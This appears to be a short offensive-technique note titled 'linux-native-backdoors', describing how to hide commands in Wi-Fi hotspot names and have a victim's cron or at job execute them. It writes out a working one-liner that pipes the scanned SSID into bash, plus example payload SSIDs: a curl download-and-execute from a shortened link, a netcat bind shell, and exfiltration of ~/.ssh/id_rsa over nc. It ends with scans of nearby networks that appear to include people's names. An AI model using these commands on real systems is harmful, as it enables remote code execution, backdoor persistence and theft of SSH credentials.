linux-native-backdoors
======================

1. create a hotspot name such as:
">curl -sL bit.ly/getouch"

2. (download and execute) now schedule your backdoor cron, at, ...
bash -c "$(nmcli -f SSID dev wifi list | cut -f2 -d\' | egrep '^>' | cut -c2- | tail -n1)" | bash

3. you can change your hotspot name to execute any remote command!
">nc -e /bin/sh -l 2222"
">nc 127.0.0.1 20 <~/.ssh/id_rsa"
...

refs:
http://www.labofapenetrationtester.com/2014/08/Introducing-Gupt.html
http://www.wirelessforums.org/alt-internet-wireless/ssid-33892.html

##### NetworkManager (non-priviledge)
$ nmcli -t -f SIGNAL,SSID dev wifi list | sort -nr
85:'padrao'
52:'danger'
35:'Lucas'
30:'Privativac'
25:'Virginia'
20:'nelson munhoz'
20:'C & B'
19:'Leonardo'
10:'wmfamwir'
10:'maison'
9:'RAMIRES'
5:'MARCELO FARIA'


##### iwlist (priviledge)
##### TODO: fix regex
$ sudo iwlist wlan0 scanning | xargs | egrep -o '(ESSID:([0-9a-zA-Z]+)|l=\-[0-9]+)' | xargs | sed 's/l=//g;s/ ESSID:/:/g' | xargs -n1 | sort -n
-95:MARCELO
-92:maison
-90:Leonardo
-90:wmfamwir
-87:nelson
-82:Lucas
-78:Virginia
-70:danger
-66:Privativac
-43:padrao

